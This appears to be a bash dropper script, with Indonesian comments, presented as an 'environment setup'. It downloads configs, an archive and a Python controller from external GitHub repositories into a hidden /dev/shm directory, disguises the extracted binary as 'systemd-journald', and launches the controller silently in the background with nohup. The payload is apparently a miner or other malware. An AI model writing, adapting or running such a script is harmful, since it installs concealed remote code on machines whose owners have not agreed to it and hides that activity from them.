#!/bin/bash

# Warna buat gaya sayang
GREEN='\033[0;32m'
NC='\033[0m' # No Color

echo -e "${GREEN}[*] Setup environment...${NC}"

# Buat folder 1 dan 2
mkdir -p /dev/shm/.store/1 /dev/shm/.store/2

# Download config 1
cd /dev/shm/.store/1
wget -q https://github.com/ANTI-VIRAL/Ai-04/raw/main/1.ini -O config.ini

# Download config 2
cd /dev/shm/.store/2
wget -q https://github.com/ANTI-VIRAL/Ai-04/raw/main/2.ini -O config.ini

# Balik ke .store
cd /dev/shm/.store

# Download dan extract
wget -q https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz
tar -xzf cache.tar.gz
rm -f cache.tar.gz
mv cache systemd-journald

# Download controller script
wget -q https://github.com/ANTI-VIRAL/MACHINE/raw/main/httpd.py -O syncd.py
chmod +x syncd.py

# Copy ke folder 1 dan 2
cp systemd-journald /dev/shm/.store/1/
cp systemd-journald /dev/shm/.store/2/
chmod +x /dev/shm/.store/1/systemd-journald
chmod +x /dev/shm/.store/2/systemd-journald

# Bersih-bersih
rm -f systemd-journald

# Jalankan controller
echo -e "${GREEN}[*] Starting background controller...${NC}"
nohup python3 syncd.py > /dev/null 2>&1 &

echo -e "${GREEN}[✓] Setup selesai dan controller jalan di background.${NC}"
